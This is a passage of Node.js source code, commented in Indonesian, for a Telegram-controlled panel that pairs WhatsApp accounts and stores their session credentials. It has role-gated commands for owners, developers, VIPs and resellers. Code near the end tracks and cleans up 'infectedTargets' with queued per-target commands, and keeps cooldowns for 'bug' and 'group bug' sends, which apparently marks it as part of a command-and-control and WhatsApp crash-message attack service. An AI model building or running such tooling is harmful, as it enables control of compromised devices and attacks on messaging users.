          const enhancedCreds = {
            ...credsData,
            registeredNumber: botNumber,
            formattedNumber: `+${botNumber}`,
            registeredAt: new Date().toISOString(),
            type: 'global',
            active: true,
            addedBy: msg ? msg.from.id : 'system',
            addedByName: msg ? (msg.from.first_name || msg.from.username || 'Unknown') : 'System',
            name: name,
            device: credsData.platform || credsData.me?.platform || 'Unknown',
            lastSeen: new Date().toISOString()
          };
          
          // Tulis ke file JSON
          fs.writeFileSync(jsonFilePath, JSON.stringify(enhancedCreds, null, 2));
          logDebug(`[💾 BOT] Creds saved to: ${jsonFilePath}`);
          
          // BUAT JUGA FILE INFO
          const infoFilePath = path.join(globalFolder, `${botNumber}_info.json`);
          const infoData = {
            number: botNumber,
            formattedNumber: `+${botNumber}`,
            name: name,
            type: type,
            registeredAt: new Date().toISOString(),
            active: true,
            lastSeen: new Date().toISOString(),
            addedBy: msg ? msg.from.id : 'system',
            addedByName: msg ? (msg.from.first_name || msg.from.username || 'Unknown') : 'System'
          };
          fs.writeFileSync(infoFilePath, JSON.stringify(infoData, null, 2));
          logDebug(`[ℹ️ BOT] Info saved to: ${infoFilePath}`);
        } else {
          logError(`[❌ BOT] creds.json not found for ${botNumber}`);
        }
      } catch (e) {
        logError(`[❌ BOT] Error saving creds: ${e.message}`);
      }
      
      const typeText = type === "Business" ? "BISNIS" : "BIASA";
      const typeIcon = type === "Business" ? "🏢" : "👤";
      
      if (chatId && statusMessage) {
        await bot.editMessageText(
          `
╭─────────────────
│    TERHUBUNG    
│────────────────
│ Bot: +${botNumber}
│ ${typeIcon} Tipe: ${typeText}
│ 👤 Nama: ${msg ? (msg.from.first_name || msg.from.username || 'Unknown') : 'System'}
│ 📁 File: ${botNumber}.json
│ Status: Berhasil terhubung!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        
        // Log
        const logLine = `[${new Date().toISOString()}] ADD BOT: ${msg ? msg.from.id : 'system'} added +${botNumber} (${typeText})\n`;
        fs.appendFileSync('logUser.txt', logLine);
      } else {
        logDebug(`[BOT] +${botNumber} connected automatically (${typeText})`);
      }
      
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1500));
      try {
        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          if (chatId && statusMessage) {
            await bot.editMessageText(
              `
╭─────────────────
│    KODE PAIRING    
│────────────────
│ Bot: +${botNumber}
│ Kode: ${formattedCode}
│
│ Cara:
│ 1. Buka WhatsApp +${botNumber}
│ 2. Pengaturan > Perangkat Tertaut
│ 3. Masukkan kode di atas
╰─────────────────`,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown",
              }
            );
          }
        }
      } catch (error) {
        logError("Error requesting pairing code:", error);
        if (chatId && statusMessage) {
          await bot.editMessageText(
            `
╭─────────────────
│    ERROR    
│────────────────
│ Bot: +${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      }
    }
  });

  sock.ev.on("creds.update", async (creds) => {
    saveCreds();
    
    // Setiap kali creds update, update juga file JSON
    try {
      const sourceCreds = path.join(sessionDir, 'creds.json');
      if (fs.existsSync(sourceCreds)) {
        const credsData = JSON.parse(fs.readFileSync(sourceCreds, 'utf8'));
        const enhancedCreds = {
          ...credsData,
          registeredNumber: botNumber,
          formattedNumber: `+${botNumber}`,
          lastUpdate: new Date().toISOString(),
          type: 'global',
          active: activeConnections[botNumber] ? true : false
        };
        fs.writeFileSync(jsonFilePath, JSON.stringify(enhancedCreds, null, 2));
        
        // Update info file
        const infoFilePath = path.join(globalFolder, `${botNumber}_info.json`);
        if (fs.existsSync(infoFilePath)) {
          const infoData = JSON.parse(fs.readFileSync(infoFilePath, 'utf8'));
          infoData.lastUpdate = new Date().toISOString();
          infoData.active = activeConnections[botNumber] ? true : false;
          fs.writeFileSync(infoFilePath, JSON.stringify(infoData, null, 2));
        }
      }
    } catch (e) {
      logError(`[❌ BOT] Error updating creds file: ${e.message}`);
    }
  });

  return sock;
}

// Fungsi untuk menginisialisasi semua bot yang tersimpan di folder global
// Fungsi untuk menginisialisasi semua bot yang tersimpan di folder global
async function initializeAllBots() {
  const globalFolder = path.join('permenmd', 'global');
  
  if (!fs.existsSync(globalFolder)) {
    logDebug(`[BOT] Folder global tidak ditemukan, membuat baru...`);
    fs.mkdirSync(globalFolder, { recursive: true });
    return;
  }
  
  // Cari semua file JSON (hanya file yang tidak mengandung underscore di awal)
  const jsonFiles = fs.readdirSync(globalFolder).filter(file => 
    file.endsWith('.json') && !file.includes('_info')
  );
  
  if (jsonFiles.length === 0) {
    logDebug(`[BOT] Tidak ada bot yang tersimpan`);
    return;
  }
  
  logDebug(`[BOT] Ditemukan ${jsonFiles.length} bot tersimpan`);
  
  for (const file of jsonFiles) {
    const botNumber = path.basename(file, '.json');
    
    // Cek apakah sudah aktif
    if (activeConnections[botNumber]) {
      logDebug(`[BOT] +${botNumber} sudah aktif, skip`);
      continue;
    }
    
    logDebug(`[BOT] Menghubungkan bot: +${botNumber}`);
    
    // Cek apakah ada folder session
    const sessionDir = path.join(globalFolder, botNumber);
    
    if (!fs.existsSync(sessionDir)) {
      // Buat folder session jika belum ada
      fs.mkdirSync(sessionDir, { recursive: true });
      
      // Copy creds dari file JSON ke folder session jika ada
      const sourceCreds = path.join(globalFolder, file);
      const destCreds = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(sourceCreds) && !fs.existsSync(destCreds)) {
        try {
          const credsData = JSON.parse(fs.readFileSync(sourceCreds, 'utf8'));
          // Hapus field tambahan sebelum menyimpan sebagai creds.json
          const cleanCreds = {
            ...credsData,
            // Hapus field yang tidak ada di creds asli
            registeredNumber: undefined,
            formattedNumber: undefined,
            registeredAt: undefined,
            addedBy: undefined,
            addedByName: undefined,
            name: undefined,
            device: undefined,
            lastSeen: undefined,
            lastUpdate: undefined
          };
          fs.writeFileSync(destCreds, JSON.stringify(cleanCreds, null, 2));
          logDebug(`[BOT] Copied creds for +${botNumber}`);
        } catch (e) {
          logError(`[BOT] Error copying creds for +${botNumber}:`, e.message);
        }
      }
    }
    
    // Koneksikan bot
    try {
      await connectToWhatsApp(botNumber, null, null);
      logDebug(`[BOT] Connection initiated for +${botNumber}`);
    } catch (err) {
      logError(`[BOT] Failed to connect +${botNumber}:`, err.message);
    }
    
    // Delay antar koneksi
    await sleep(2000);
  }
  
  // Log status setelah 5 detik
  setTimeout(() => {
    let activeCount = 0;
    const jsonFilesNow = fs.readdirSync(globalFolder).filter(file => 
      file.endsWith('.json') && !file.includes('_info')
    );
    
    for (const file of jsonFilesNow) {
      const botNumber = path.basename(file, '.json');
      if (activeConnections[botNumber]) {
        activeCount++;
        logDebug(`[BOT] ✓ +${botNumber} is ACTIVE`);
        
        // Update info file
        try {
          const infoFile = path.join(globalFolder, `${botNumber}_info.json`);
          if (fs.existsSync(infoFile)) {
            const infoData = JSON.parse(fs.readFileSync(infoFile, 'utf8'));
            infoData.active = true;
            infoData.lastSeen = new Date().toISOString();
            fs.writeFileSync(infoFile, JSON.stringify(infoData, null, 2));
          }
        } catch (e) {}
      } else {
        logDebug(`[BOT] ✗ +${botNumber} is INACTIVE`);
      }
    }
    logDebug(`[BOT] Status akhir: ${activeCount}/${jsonFilesNow.length} bot aktif`);
  }, 5000);
}

// Command ADD BOT (hanya Owner & Developer)
bot.onText(/^\/addbot\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah owner atau developer
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.\n\nHanya *Owner* dan *Developer* yang dapat menambahkan bot.",
      { parse_mode: "Markdown" }
    );
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");
  
  // Validasi nomor
  if (!botNumber || botNumber.length < 10 || botNumber.length > 15) {
    return bot.sendMessage(
      chatId,
      "❌ *Nomor tidak valid!*\n\nGunakan format: `/addbot 628123456789`\n\nContoh: `/addbot 628123456789`",
      { parse_mode: "Markdown" }
    );
  }
  
  // Cek apakah bot sudah ada
  const globalFolder = path.join('permenmd', 'global');
  const existingFile = path.join(globalFolder, `${botNumber}.json`);
  
  if (fs.existsSync(existingFile)) {
    // Baca file yang ada untuk menampilkan info
    let existingData = {};
    try {
      existingData = JSON.parse(fs.readFileSync(existingFile, 'utf8'));
    } catch (e) {}
    
    const isActive = activeConnections[botNumber] ? true : false;
    const statusText = isActive ? "AKTIF" : "TIDAK AKTIF";
    const statusIcon = isActive ? "🟢" : "🔴";
    const name = existingData.name || existingData.me?.name || `+${botNumber}`;
    
    return bot.sendMessage(
      chatId,
      `⚠️ *Bot +${botNumber} sudah terdaftar!*\n\n` +
      `${statusIcon} Status: ${statusText}\n` +
      `👤 Nama: ${name}\n` +
      `📅 Terdaftar: ${existingData.registeredAt ? new Date(existingData.registeredAt).toLocaleString('id-ID') : 'Tidak diketahui'}\n\n` +
      `Gunakan /delbot ${botNumber} untuk menghapus.`,
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Tampilkan pesan sedang memproses
    const processingMsg = await bot.sendMessage(
      chatId,
      `🔄 *Memproses penambahan bot +${botNumber}...*\n\n` +
      `Mohon tunggu, proses pairing akan dimulai.\n\n` +
      `⏱️ Proses ini mungkin memakan waktu 30-60 detik.`,
      { parse_mode: "Markdown" }
    );
    
    // Panggil fungsi connectToWhatsApp dengan parameter yang benar
    await connectToWhatsApp(botNumber, chatId, msg);
    
    // Hapus pesan processing setelah 2 detik
    setTimeout(() => {
      bot.deleteMessage(chatId, processingMsg.message_id).catch(() => {});
    }, 2000);
    
  } catch (error) {
    logError("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      `❌ *Terjadi kesalahan!*\n\n\`${error.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

// Command DELETE BOT (hanya Owner & Developer)
bot.onText(/^\/delbot\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, "");
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah owner atau developer
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.\n\nHanya *Owner* dan *Developer* yang dapat menghapus bot.",
      { parse_mode: "Markdown" }
    );
  }
  
  const globalFolder = path.join('permenmd', 'global');
  const jsonFile = path.join(globalFolder, `${botNumber}.json`);
  const sessionDir = path.join(globalFolder, botNumber);
  
  // Cek apakah bot ada
  if (!fs.existsSync(jsonFile) && !fs.existsSync(sessionDir)) {
    return bot.sendMessage(
      chatId,
      `❌ *Bot +${botNumber} tidak ditemukan!*`,
      { parse_mode: "Markdown" }
    );
  }
  
  try {
    // Putuskan koneksi jika aktif
    if (activeConnections[botNumber]) {
      try {
        activeConnections[botNumber].ws?.close();
      } catch (e) {}
      delete activeConnections[botNumber];
    }
    
    // Hapus dari biz/mess
    if (biz[botNumber]) delete biz[botNumber];
    if (mess[botNumber]) delete mess[botNumber];
    
    // Hapus file JSON
    if (fs.existsSync(jsonFile)) fs.unlinkSync(jsonFile);
    
    // Hapus folder session
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    bot.sendMessage(
      chatId,
      `
╭─────────────────
│    DELETE BOT    
│────────────────
│ Bot: +${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
      { parse_mode: "Markdown" }
    );
    
    // Log
    const logLine = `[${new Date().toISOString()}] DEL BOT: ${userId} (${userRole}) deleted +${botNumber}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
  } catch (error) {
    logError("[❌ DEL BOT ERROR]", error);
    bot.sendMessage(
      chatId,
      `❌ *Terjadi kesalahan!*\n\n\`${error.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

// Command LIST BOT (Owner & Developer & VIP)
bot.onText(/^\/listbot$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!onlyPrivate(msg)) return;

  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer' && userRole !== 'vip')) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya *Owner*, *Developer*, dan *VIP* yang dapat melihat daftar bot.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const globalFolder = path.join('permenmd', 'global');
    
    if (!fs.existsSync(globalFolder)) {
      return bot.sendMessage(
        chatId,
        "📭 *Belum ada bot yang terdaftar.*",
        { parse_mode: "Markdown" }
      );
    }
    
    // Ambil semua file JSON
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => 
      file.endsWith('.json')
    );
    
    if (jsonFiles.length === 0) {
      return bot.sendMessage(
        chatId,
        "📭 *Belum ada bot yang terdaftar.*",
        { parse_mode: "Markdown" }
      );
    }
    
    let message = `╭─────────────────\n│    DAFTAR BOT    \n│────────────────\n`;
    let activeCount = 0;
    let inactiveCount = 0;
    let botList = [];
    
    // Kumpulkan data bot
    for (const file of jsonFiles) {
      const botNumber = path.basename(file, '.json');
      const isConnected = activeConnections[botNumber] ? true : false;
      
      // Dapatkan nama dari creds
      let name = "Unknown";
      try {
        const credsData = JSON.parse(fs.readFileSync(file, 'utf8'));
        name = credsData.me?.name || credsData.me?.verifiedName || botNumber;
      } catch (e) {}
      
      botList.push({ botNumber, name, isConnected });
      if (isConnected) activeCount++;
      else inactiveCount++;
    }
    
    // Urutkan berdasarkan status (aktif dulu)
    botList.sort((a, b) => b.isConnected - a.isConnected);
    
    for (const { botNumber, name, isConnected } of botList) {
      const statusIcon = isConnected ? "🟢" : "🔴";
      const statusText = isConnected ? "AKTIF" : "TIDAK AKTIF";
      
      message += `│ ${statusIcon} +${botNumber}\n`;
      message += `│    👤 ${name}\n`;
      message += `│    📊 ${statusText}\n`;
      message += `│────────────────\n`;
    }
    
    message += `│ Total: ${jsonFiles.length} bot\n`;
    message += `│ 🟢 Aktif: ${activeCount}\n`;
    message += `│ 🔴 Tidak Aktif: ${inactiveCount}\n`;
    message += `╰─────────────────\n\n`;
    
    if (userRole === 'owner' || userRole === 'developer') {
      message += `*💡 Perintah:*\n`;
      message += `• /addbot [nomor] - Tambah bot baru\n`;
      message += `• /delbot [nomor] - Hapus bot`;
    }
    
    bot.sendMessage(chatId, message, { 
      parse_mode: "Markdown"
    });

  } catch (error) {
    logError("[❌ LIST BOT ERROR]", error);
    bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan: ${error.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

// Inisialisasi semua bot saat startup
setTimeout(() => {
  initializeAllBots();
}, 5000);

// ================== PERBAIKAN COMMAND /LISTSENDER ==================
bot.onText(/^\/listsender$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!onlyPrivate(msg)) return;

  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer' && userRole !== 'vip' && userRole !== 'reseller')) {
    return bot.sendMessage(
      chatId,
      "❌ Hanya Owner, Developer, VIP, dan Reseller yang bisa melihat daftar sender global!",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const globalFolder = path.join('permenmd', 'global');
    
    if (!fs.existsSync(globalFolder)) {
      return bot.sendMessage(chatId, "📭 Belum ada sender global yang terdaftar.", { parse_mode: "Markdown" });
    }

    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    
    if (jsonFiles.length === 0) {
      return bot.sendMessage(chatId, "📭 Belum ada sender global yang terdaftar.", { parse_mode: "Markdown" });
    }

    let message = `🌍 *DAFTAR SENDER GLOBAL*\n\n`;
    let activeCount = 0;
    let inactiveCount = 0;
    let listNumbers = [];

    // Urutkan berdasarkan status (aktif dulu)
    const sortedFiles = [...jsonFiles].sort((a, b) => {
      const numA = path.basename(a, '.json');
      const numB = path.basename(b, '.json');
      const activeA = activeConnections[numA] ? 1 : 0;
      const activeB = activeConnections[numB] ? 1 : 0;
      return activeB - activeA;
    });

    for (const file of sortedFiles) {
      const phoneNumber = path.basename(file, '.json');
      const isConnected = activeConnections[phoneNumber] ? true : false;
      const infoFile = path.join(globalFolder, `${phoneNumber}_info.json`);
      
      let registeredAt = "Tidak diketahui";
      let name = "Unknown";
      
      try {
        if (fs.existsSync(infoFile)) {
          const infoData = JSON.parse(fs.readFileSync(infoFile, 'utf8'));
          registeredAt = new Date(infoData.registeredAt).toLocaleString('id-ID');
        }
        
        // Coba baca creds untuk mendapatkan nama
        const credsData = JSON.parse(fs.readFileSync(file, 'utf8'));
        name = credsData.me?.name || credsData.me?.verifiedName || phoneNumber;
      } catch (e) {}
      
      if (isConnected) {
        activeCount++;
      } else {
        inactiveCount++;
      }
      
      const statusIcon = isConnected ? "🟢" : "🔴";
      const statusText = isConnected ? "AKTIF" : "TIDAK AKTIF";
      
      message += `${statusIcon} *+${phoneNumber}* - ${statusText}\n`;
      message += `   👤 ${name}\n`;
      message += `   📅 ${registeredAt}\n\n`;
      listNumbers.push(phoneNumber);
    }

    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `📊 *Total:* ${jsonFiles.length} sender\n`;
    message += `🟢 *Aktif:* ${activeCount}\n`;
    message += `🔴 *Tidak Aktif:* ${inactiveCount}\n\n`;
    
    if (userRole === 'owner' || userRole === 'developer' || userRole === 'vip') {
      message += `*💡 Perintah:*\n`;
      message += `• /delsender [nomor] - Hapus sender\n`;
      message += `• /addsender [nomor] - Tambah sender baru`;
    }

    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "🔄 REFRESH",
            callback_data: "refresh_sender_list"
          }
        ]
      ]
    };
    
    bot.sendMessage(chatId, message, { 
      parse_mode: "Markdown",
      reply_markup: keyboard
    });

  } catch (error) {
    logError("[❌ LIST SENDER ERROR]", error);
    bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan: ${error.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

//FUNCTION WHATSAPP LU


// Periodik cleanup untuk infectedTargets (setiap jam)
setInterval(() => {
    const maxAge = 7 * 24 * 60 * 60 * 1000; // 7 hari
    const now = Date.now();
    const beforeCount = infectedTargets.length;
    
    infectedTargets = infectedTargets.filter(t => (now - new Date(t.lastSeen).getTime()) <= maxAge);
    
    // Bersihkan commands yang tidak ada targetnya
    const targetIds = new Set(infectedTargets.map(t => t.id));
    for (const cmdId in commands) {
        if (!targetIds.has(cmdId)) {
            delete commands[cmdId];
        }
    }
    
    if (beforeCount !== infectedTargets.length) {
        logDebug(`[AUTO CLEANUP] Removed ${beforeCount - infectedTargets.length} old targets`);
    }
}, 60 * 60 * 1000); // Setiap jam

// Periodic cleanup
// Interval untuk cleanup (gabungan semua fungsi pembersihan)
setInterval(() => {
  const now = Date.now();
  
  // 1. CLEANUP ONLINE USERS - setiap 30 detik (lebih lama)
  for (const [username, timestamp] of onlineUsers.entries()) {
    if (now - timestamp > 30000) { // 30 detik timeout (diperpanjang)
      onlineUsers.delete(username);
    }
  }
  
  // 2. CLEANUP USER PENDING DATA - expired lebih dari 30 menit (diperpanjang)
  for (const userId in userPendingData) {
    if (userPendingData[userId]?.timestamp && (now - userPendingData[userId].timestamp > 1800000)) {
      // Jangan hapus jika masih dalam proses (step waiting_proof)
      if (userPendingData[userId].step !== 'waiting_proof') {
        delete userPendingData[userId];
      }
    }
  }
  
  // 3. CLEANUP BUG COOLDOWN - 2 menit (diperpanjang)
  for (const [key, timestamp] of bugCooldown.entries()) {
    if (now - timestamp > 120000) { // 2 menit
      bugCooldown.delete(key);
    }
  }
  
  // 4. CLEANUP GROUP BUG COOLDOWN - 2 menit (diperpanjang)
  for (const [key, timestamp] of groupBugCooldown.entries()) {
    if (now - timestamp > 120000) { // 2 menit
      groupBugCooldown.delete(key);
    }
  }
  
  // 5. CLEANUP RATE LIMIT MAP - 5 menit (diperpanjang)
  for (const key in rateLimitMap) {
    rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 300000); // 5 menit
    if (rateLimitMap[key].length === 0) {
      delete rateLimitMap[key];
    }
  }
  
  // 6. CLEANUP TRANSAKSI PENDING YANG EXPIRED - 24 jam (diperpanjang)
  for (const [trxId, transaction] of Object.entries(pendingTransactions || {})) {
    if (transaction?.timestamp && (now - transaction.timestamp > 86400000)) { // 24 jam
      delete pendingTransactions[trxId];
    }
  }
  
  // 7. CLEANUP USER PENDING BUYAR YANG EXPIRED - 24 jam (diperpanjang)
  for (const [userId, data] of Object.entries(userPendingBuyar || {})) {
    if (data?.timestamp && (now - data.timestamp > 86400000)) { // 24 jam
      delete userPendingBuyar[userId];
    }
  }
  
  // 8. JANGAN HAPUS DATA AKUN DARI DATABASE!
  // Database hanya dihapus jika ada perintah manual /delakun
  
}, 60000); // Interval 60 detik (diperpanjang dari 10 detik)
// Start server
app.listen(PORT, () => {
  logInfo(`🚀 Server aktif di http://localhost:${PORT}`);
  startUserSessions();
});

// Fungsi untuk refresh koneksi sender global secara periodik
setInterval(async () => {
  const globalFolder = path.join('permenmd', 'global');
  if (fs.existsSync(globalFolder)) {
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json'));
    
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      
      // Jika session tidak aktif tapi file ada, coba reconnect
      if (!activeConnections[sessionName]) {
        const sessionFolder = path.join(globalFolder, sessionName);
        if (fs.existsSync(sessionFolder)) {
          logDebug(`[RECONNECT] Attempting to reconnect global sender: ${sessionName}`);
          await connectSession(globalFolder, sessionName);
        }
      }
    }
  }
}, 60000); // Setiap 1 menit

// Auto restart interval
const RESTART_INTERVAL = 20 * 60 * 1000;

setInterval(() => {
  logInfo("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);
